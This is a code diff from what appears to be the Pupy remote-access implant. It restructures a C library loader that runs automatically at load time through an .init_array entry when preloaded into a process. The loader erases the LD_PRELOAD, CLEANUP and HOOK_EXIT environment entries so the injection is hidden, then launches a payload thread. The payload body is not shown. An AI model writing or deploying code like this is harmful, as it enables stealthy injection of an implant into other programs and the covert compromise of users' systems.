@@ -54,8 +54,7 @@ void __on_exit(int status, void *data) {
     _exit(status);
 }
 
-
-static void _fill_argv(int argc, char* argv[], char* envp[]) {
+static void _pupy_main(int argc, char* argv[], char* envp[]) {
     dprint("fill_argv called: %d/%p/%p\n", argc, argv, envp);
 #ifdef DEBUG
     int i;
@@ -64,30 +63,12 @@ static void _fill_argv(int argc, char* argv[], char* envp[]) {
     }
 #endif
 
-    __argc = argc;
-    __argv = argv;
-
-    while (*envp) {
-        if ((strncmp(*envp, "LD_PRELOAD=", 11) == 0)
-            || strncmp(*envp, "CLEANUP=", 8) == 0
-            || strncmp(*envp, "HOOK_EXIT=", 10) == 0) {
-            dprint("CLEAN %s\n", *envp);
-            memset(*envp, 0, strlen(*envp));
-        }
-        envp++;
-    }
-}
-
-__attribute__((section(".init_array"))) void (* pfill_argv)(int, char*[], char*[]) = _fill_argv;
-
-__attribute__((constructor))
-void loader() {
-    pthread_attr_t attr;
-    pthread_attr_init(&attr);
-
     char *ldpreload = getenv("LD_PRELOAD");
     char *cleanup = getenv("CLEANUP");
     char *hook_exit = getenv("HOOK_EXIT");
+
+    __argc = argc;
+    __argv = argv;
 
     if (hook_exit && strncmp(hook_exit, "1", 1) == 0)
         __to_wait = 1;
@@ -110,9 +91,23 @@ void loader() {
     atexit(__atexit);
     on_exit(__on_exit, NULL);
 
-    dprint("Start thread (LDPRELOAD=%s/%d)\n", ldpreload, __to_wait);
+    while (*envp) {
+        if ((strncmp(*envp, "LD_PRELOAD=", 11) == 0)
+            || strncmp(*envp, "CLEANUP=", 8) == 0
+            || strncmp(*envp, "HOOK_EXIT=", 10) == 0) {
+            dprint("CLEAN %s\n", *envp);
+            memset(*envp, 0, strlen(*envp));
+        }
+        envp++;
+    }
+
+    dprint("Start payload, wait=%d\n", __to_wait);
+
+    pthread_attr_t attr;
+    pthread_attr_init(&attr);
     pthread_create(
-        &thread_id, &attr,
-        thread_start, NULL
-    );
+            &thread_id, &attr,
+            thread_start, NULL);
 }
+
+__attribute__((section(".init_array"))) void (* pupy_main)(int, char*[], char*[]) = _pupy_main;
